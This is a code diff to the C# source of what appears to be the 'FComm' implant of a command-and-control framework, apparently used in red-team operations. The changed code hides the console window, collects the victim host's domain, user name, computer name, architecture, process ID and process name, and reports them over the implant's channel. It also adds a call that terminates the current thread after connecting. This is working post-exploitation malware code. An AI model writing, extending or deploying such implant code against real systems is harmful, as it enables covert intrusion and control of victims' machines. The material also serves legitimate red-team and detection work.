@@ -10,8 +10,7 @@ using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading;
-
+using System.Threading; 
 
 public class Program
 {
@@ -23,24 +22,24 @@ public class Program
     public static bool running;
     public static bool initialised;
     public static FCClient FComm;
-    private static StringWriter backgroundTaskOutput = new StringWriter();
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     public const int SW_HIDEN = 0;
     public const int SW_SHOW = 5;
-
+    private static StringWriter backgroundTaskOutput = new StringWriter();
+    [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
+    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
+    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+    [DllImport("kernel32.dll")] static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);
+    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
     public static void Sharp()
-    {
-        var handle = GetConsoleWindow();
-        ShowWindow(handle, SW_HIDEN);
+    {       
+        ShowWindow(GetConsoleWindow(), SW_HIDEN);
         Program.filename = @"#REPLACEFCOMMFILENAME#";
         Program.encryption = @"#REPLACEKEY#";
         Program.kill = false;
         FCommConnect();
-
+        var x = GetCurrentThread();
+        TerminateThread(x, 0);
     }
 
     public static void Main()
@@ -77,8 +76,9 @@ public class Program
             string cn = Environment.GetEnvironmentVariable("COMPUTERNAME");
             string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
             int pid = Process.GetCurrentProcess().Id;
+            var procname = Process.GetCurrentProcess().ProcessName;
             Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
-            string hostinfo = String.Format("FComm-Connected: {0};{1};{2};{3};{4};", dn, u, cn, arch, pid);
+            string hostinfo = String.Format("FComm-Connected: {0};{1};{2};{3};{4};{5};", dn, u, cn, arch, pid,procname);
             FComm = new FCClient(filename, hostinfo, encryption);
             initialised = true;
 
@@ -154,8 +154,8 @@ public class Program
                     }
                     else if (cmd.ToLower() == "get-bg")
                     {
-			//Removing this as Rob says this should just work, but it's not been properly tested yet.
-			sOutput2.WriteLine("[!] This is not implemented yet in FComm implant types.");
+            //Removing this as Rob says this should just work, but it's not been properly tested yet.
+            sOutput2.WriteLine("[!] This is not implemented yet in FComm implant types.");
                         /*
                         var backgroundTaskOutputString = backgroundTaskOutput.ToString();
                         if (!string.IsNullOrEmpty(backgroundTaskOutputString))
@@ -195,7 +195,6 @@ public class Program
         }
     }
 
-    [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
     private static string[] ParseCommandLineArgs(string cl)
     {
         int argc;
